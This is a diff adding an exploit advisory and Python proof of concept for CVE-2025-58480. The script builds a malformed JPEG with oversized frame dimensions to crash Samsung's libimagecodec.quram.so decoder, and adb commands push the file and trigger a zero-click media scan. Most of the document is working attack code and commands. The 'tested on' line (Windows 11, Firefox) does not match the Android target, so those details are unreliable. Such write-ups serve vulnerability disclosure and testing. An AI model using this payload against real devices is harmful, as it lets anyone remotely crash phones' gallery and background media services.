@@ -1,0 +1,138 @@
+=============================================================================================================================================
+| # Title     : Samsung libimagecodec.quram.so Malformed JPEG Triggers Buffer Overflow                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.samsung.com/us/                                                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213368/ & CVE-2025-58480
+
+[+] Summary    : This proof-of-concept demonstrates a denial-of-service vulnerability in Samsung’s libimagecodec.quram.so JPEG decoder. 
+                 By crafting a structurally valid JPEG file with maliciously large image dimensions (height 65535, width 2862) in the SOF0 marker, 
+				 the decoder performs unsafe size calculations during image parsing. This can lead to integer overflow or incorrect memory allocation, 
+				 resulting in a crash when the image is processed by Samsung Gallery or background services such as IPservice. 
+                 The PoC relies on minimal scan data and standard JPEG markers to pass initial validation, triggering the failure 
+				 before full decoding occurs. The impact is a crash (DoS); no remote code execution is demonstrated.
+
+[+] Testing steps :
+
+# 1. Create a PoC file : python3 poc_cve_2025_58480.py poc.jpg
+
+# 2. Move it to the target machine : adb push poc.jpg /storage/emulated/0/DCIM/
+
+# 3. Run a media scan (for 0-click exploits)
+
+adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///storage/emulated/0/DCIM/poc.jpg
+
+# 4. Monitor the logs (to see the cracking)
+adb logcat | grep -E "(SIGSEGV|libimagecodec|FATAL)"
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import struct
+import sys
+
+def create_malformed_jpeg(output_path):
+
+    soi = b'\xFF\xD8'
+
+    app0 = b'\xFF\xE0' + struct.pack('>H', 16) + b'JFIF\x00\x01\x01\x00\x00\x01'
+
+    dqt_data = b''
+    for i in range(2):  
+        dqt_data += b'\xFF\xDB' + struct.pack('>H', 67)  
+        dqt_data += bytes([i])  
+
+        dqt_data += bytes([1]) * 64
+  
+    dht = (b'\xFF\xC4' + struct.pack('>H', 29) + 
+           b'\x00' +  # Table ID (0 for DC luminance)
+           b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +  # BITS
+           b'\x00' +  # HUFFVAL (minimal)
+           b'\xFF\xC4' + struct.pack('>H', 29) + 
+           b'\x10' +  # Table ID (16 for AC chrominance)
+           b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + 
+           b'\x00')
+
+    height = 65535  
+    width = 2862    
+    
+    sof0 = (b'\xFF\xC0' +  
+            struct.pack('>H', 17) +  
+            b'\x08' +  
+            struct.pack('>H', height) +  
+            struct.pack('>H', width) +  
+            b'\x03' +  
+            
+       
+            b'\x01' +  
+            b'\x11' +  
+            b'\x00' +  
+
+            b'\x02' +  
+            b'\x11' +  
+            b'\x01' +  
+
+            b'\x03' +  
+            b'\x11' +  
+            b'\x01')   
+
+    sos = (b'\xFF\xDA' + struct.pack('>H', 12) + 
+           b'\x03' +  
+           b'\x01\x00' +  
+           b'\x02\x11' +  
+           b'\x03\x11' +  
+           b'\x00\x3F\x00')  
+
+    compressed_data = b''
+
+    for _ in range(10):
+    
+        compressed_data += b'\xA0'
+
+        compressed_data += b'\x00'
+
+    eoi = b'\xFF\xD9'
+
+    jpeg_data = (soi + app0 + dqt_data + dht + sof0 + sos + 
+                 compressed_data + eoi)
+
+    with open(output_path, 'wb') as f:
+        f.write(jpeg_data)
+    
+    print(f"[+] Malformed JPEG created: {output_path}")
+    print(f"[+] Dimensions: {width} x {height}")
+    print(f"[+] File size: {len(jpeg_data)} bytes")
+    print("[+] Expected behavior: Crash in libimagecodec.quram.so")
+    return True
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <output_file.jpg>")
+        sys.exit(1)
+    
+    output_file = sys.argv[1]
+    
+    if not output_file.lower().endswith(('.jpg', '.jpeg')):
+        print("[!] Warning: Output file should have .jpg or .jpeg extension")
+    
+    try:
+        create_malformed_jpeg(output_file)
+        print("\n[+] PoC created successfully.")
+        print("[+] To test on Samsung Galaxy S24 Ultra (One UI 8.0):")
+        print("    1. adb push poc.jpg /storage/emulated/0/DCIM/")
+        print("    2. adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///storage/emulated/0/DCIM/poc.jpg")
+        print("    3. Open in Samsung Gallery or wait for IPservice to process")
+        
+    except Exception as e:
+        print(f"[-] Error creating PoC: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
